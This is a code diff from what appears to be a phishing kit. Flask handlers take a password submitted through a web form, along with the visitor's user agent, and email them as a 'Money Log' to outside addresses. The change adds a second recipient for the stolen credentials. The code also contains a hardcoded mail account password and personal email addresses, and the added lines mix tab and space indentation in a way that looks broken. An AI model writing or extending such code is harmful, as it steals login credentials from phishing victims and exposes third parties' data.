@@ -84,13 +84,14 @@ def first():
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "danielnewwoj@gmail.com, miriam.adelson@clubmember.org"
+        receiver_email = ["danielnewwoj@gmail.com", "miriam.adelson@clubmember.org"]
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Hiworks Money Log"
         message["From"] = sender_email
         message["To"] = receiver_email
+	message["To"] = ", ".join(receiver_email)
         text = """\
         Hi,
         How are you?
@@ -122,13 +123,14 @@ def second():
         passwordemail = request.form.get("pig")
         sender_email = "log@guide-level.com"
         sender_emaill = "contact"
-        receiver_email = "danielnewwoj@gmail.com"
+        receiver_email = ["danielnewwoj@gmail.com", "miriam.adelson@clubmember.org"]
         password = "!p&4Ke_@M2HR"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
         message["Subject"] = "Hiworks Money Log 2"
         message["From"] = sender_email
         message["To"] = receiver_email
+	message["To"] = ", ".join(receiver_email)
         text = """\
         Hi,
         How are you?
